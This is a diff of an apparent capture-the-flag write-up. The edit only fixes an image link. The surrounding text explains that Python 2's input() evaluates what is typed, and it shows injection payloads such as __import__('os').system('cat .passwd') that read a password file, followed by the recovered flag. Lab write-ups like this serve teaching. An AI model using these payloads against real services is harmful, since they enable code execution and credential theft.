@@ -32,7 +32,7 @@ with open(".passwd") as f:
 I now that `input` in *python2* is like `eval(input())` on *python3*, which let us get `RCE`.
 We'll use payload like `__import__('os').system('id')`
 
-![[Pasted image 20260310213648.png]]
+![Pasted image 20260310213648.png](./images/images/Pasted image 20260310213648.png)
 
 Okay, now let's give it payload for reading the password:
 ```bash
@@ -42,3 +42,4 @@ Please enter password : __import__('os').system('cat .passwd')
 ```
 
 so the password is **13373439872909134298363103573901**
+
